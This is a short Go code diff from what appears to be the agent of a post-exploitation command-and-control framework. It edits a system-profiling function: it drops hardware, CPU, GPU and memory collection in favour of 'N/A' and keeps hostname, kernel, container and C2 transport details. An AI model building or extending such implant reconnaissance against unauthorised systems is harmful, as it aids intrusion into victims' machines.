@@ -151,8 +151,7 @@ func CollectFullSystemInfo() *def.Emp3r0rAgent {
 		logging.Infof("Gethostname: %v", err)
 		hostname = "unknown_host"
 	}
-	// Native lightweight product info (no ghw dependency)
-	info.Hardware = sysinfo.GetHardwareInfo()
+	info.Hardware = "N/A"
 	info.CWD, err = os.Getwd()
 	if err != nil {
 		logging.Infof("Getwd: %v", err)
@@ -167,10 +166,9 @@ func CollectFullSystemInfo() *def.Emp3r0rAgent {
 	info.Version = def.Version
 	info.Kernel = osinfo.Kernel
 	info.Arch = osinfo.Architecture
-	info.CPU = util.GetCPUInfo()
-	info.GPU = util.GetGPUInfo()
-	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
-	// info.Hardware already set
+	info.CPU = "N/A"
+	info.GPU = "N/A"
+	info.Mem = "N/A"
 	info.Container = sysinfo.CheckContainer()
 	info.Transport = genC2TransportString()
 	def.Transport = info.Transport
